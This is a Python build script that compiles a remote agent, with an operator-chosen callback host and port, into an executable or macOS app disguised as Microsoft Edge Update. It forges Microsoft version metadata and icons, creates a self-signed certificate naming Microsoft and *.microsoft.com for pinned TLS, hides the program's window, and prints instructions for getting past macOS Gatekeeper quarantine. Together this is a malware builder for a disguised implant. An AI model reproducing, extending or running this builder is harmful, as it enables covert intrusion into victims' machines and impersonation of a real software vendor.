import hashlib
import os
import plistlib
import shutil
import ssl
import subprocess
import sys
from pathlib import Path

from PIL import Image, ImageDraw, ImageFont

BASE = Path(__file__).parent
HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = sys.argv[2] if len(sys.argv) > 2 else "443"
NAME = "MicrosoftEdgeUpdate"
BUNDLE_ID = "com.microsoft.EdgeUpdate"
MAC = sys.platform == "darwin"
WIN = os.name == "nt"
CERT = BASE / "cert.pem"
KEY = BASE / "key.pem"
ICON = BASE / ("edge.icns" if MAC else "edge.ico")
VERSION = BASE / "version_info.txt"


def make_cert():
    if CERT.exists() and KEY.exists():
        return
    print("[*] generating server certificate")
    subprocess.run(
        ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
         "-keyout", str(KEY), "-out", str(CERT), "-days", "3650",
         "-subj", "/CN=Microsoft Edge Update/O=Microsoft Corporation",
         "-addext", "subjectAltName=DNS:microsoft.com,DNS:*.microsoft.com"],
        check=True, capture_output=True,
    )


def _font(size):
    candidates = [
        r"C:\Windows\Fonts\segoeuib.ttf",
        "/System/Library/Fonts/Supplemental/Arial Bold.ttf",
        "/System/Library/Fonts/Helvetica.ttc",
    ]
    for path in candidates:
        try:
            return ImageFont.truetype(path, size)
        except Exception:
            pass
    try:
        return ImageFont.load_default(size)
    except Exception:
        return ImageFont.load_default()


def _draw_icon(size):
    img = Image.new("RGBA", (size, size), (0, 0, 0, 0))
    d = ImageDraw.Draw(img)
    s = size / 256
    d.rounded_rectangle([8 * s, 8 * s, 248 * s, 248 * s], radius=56 * s, fill=(0, 114, 198, 255))
    d.ellipse([168 * s, 28 * s, 236 * s, 96 * s], fill=(255, 255, 255, 235))
    d.text((110 * s, 118 * s), "e", font=_font(int(190 * s)),
           fill=(255, 255, 255, 255), anchor="mm")
    return img


def make_icon():
    if ICON.exists():
        return
    print("[*] drawing icon")
    if MAC:
        sizes = [(16, 16), (32, 32), (64, 64), (128, 128), (256, 256), (512, 512), (1024, 1024)]
        _draw_icon(1024).save(ICON, sizes=sizes)
    else:
        sizes = [(16, 16), (24, 24), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)]
        _draw_icon(256).save(ICON, sizes=sizes)


def make_version():
    VERSION.write_text(f"""VSVersionInfo(
  ffi=FixedFileInfo(filevers=(1,3,195,17), prodvers=(1,3,195,17), mask=0x3f,
    flags=0x0, OS=0x40004, fileType=0x1, subtype=0x0, date=(0,0)),
  kids=[
    StringFileInfo([StringTable('040904B0', [
      StringStruct('CompanyName', 'Microsoft Corporation'),
      StringStruct('FileDescription', 'Microsoft Edge Update'),
      StringStruct('FileVersion', '1.3.195.17'),
      StringStruct('InternalName', '{NAME}'),
      StringStruct('LegalCopyright', 'Copyright (C) Microsoft Corporation. All rights reserved.'),
      StringStruct('OriginalFilename', '{NAME}.exe'),
      StringStruct('ProductName', 'Microsoft Edge Update'),
      StringStruct('ProductVersion', '1.3.195.17')])]),
    VarFileInfo([VarStruct('Translation', [1033, 1200])])
  ]
)""", encoding="utf-8")


def pin():
    der = ssl.PEM_cert_to_DER_cert(CERT.read_text())
    return hashlib.sha256(der).hexdigest()


def build_app():
    app = BASE / "dist" / f"{NAME}.app"
    info = app / "Contents" / "Info.plist"
    with open(info, "rb") as f:
        pl = plistlib.load(f)
    pl.update({
        "CFBundleName": "Microsoft Edge Update",
        "CFBundleDisplayName": "Microsoft Edge Update",
        "CFBundleIdentifier": BUNDLE_ID,
        "CFBundleShortVersionString": "1.3.195.17",
        "CFBundleVersion": "1.3.195.17",
        "NSHumanReadableCopyright": "Copyright (C) Microsoft Corporation. All rights reserved.",
        "LSUIElement": True,
        "NSHighResolutionCapable": True,
    })
    with open(info, "wb") as f:
        plistlib.dump(pl, f)
    subprocess.run(["codesign", "--force", "--deep", "--sign", "-", str(app)],
                   check=True, capture_output=True)
    dest = BASE / f"{NAME}.app"
    shutil.rmtree(dest, ignore_errors=True)
    shutil.copytree(app, dest, symlinks=True)
    archive = BASE / f"{NAME}-mac.zip"
    archive.unlink(missing_ok=True)
    subprocess.run(["ditto", "-c", "-k", "--sequesterRsrc", "--keepParent",
                    str(dest), str(archive)], check=True)
    size = sum(p.stat().st_size for p in dest.rglob("*") if p.is_file())
    print(f"[+] done: {dest} ({(size / 1048576):.1f} MB)")
    print(f"[+] deliverable: {archive}")
    print("[!] unsigned build: Gatekeeper -> right-click Open (older macOS) or")
    print("    System Settings > Privacy & Security > Open Anyway")
    print("    or: xattr -d com.apple.quarantine /path/to/MicrosoftEdgeUpdate.app")


def main():
    make_cert()
    src = (BASE / "agent.py").read_text(encoding="utf-8")
    src = src.replace("@HOST@", HOST).replace("@PORT@", str(int(PORT)))
    src = src.replace("@TLS@", "1").replace("@PIN@", pin())
    build_src = BASE / "_agent_build.py"
    build_src.write_text(src, encoding="utf-8")
    make_icon()
    out_name = NAME + (".exe" if WIN else "")
    print(f"[*] building {out_name} -> {HOST}:{PORT}")
    cmd = [
        sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole",
        "--name", NAME, "--icon", str(ICON),
        "--clean", "--noupx", "--log-level", "WARN",
        "--distpath", str(BASE / "dist"), "--workpath", str(BASE / "build"),
        "--specpath", str(BASE), str(build_src),
    ]
    if MAC:
        cmd[3:3] = ["--windowed", "--osx-bundle-identifier", BUNDLE_ID]
    else:
        make_version()
        cmd[7:7] = ["--version-file", str(VERSION)]
    subprocess.run(cmd, check=True, cwd=BASE)
    if MAC:
        build_app()
    else:
        exe = BASE / "dist" / out_name
        size = exe.stat().st_size
        shutil.copy2(exe, BASE / out_name)
        print(f"[+] done: {BASE / out_name} ({(size / 1048576):.1f} MB)")
    for junk in ("build", "dist", f"{NAME}.spec", "_agent_build.py"):
        p = BASE / junk
        shutil.rmtree(p, ignore_errors=True) if p.is_dir() else p.unlink(missing_ok=True)


if __name__ == "__main__":
    main()
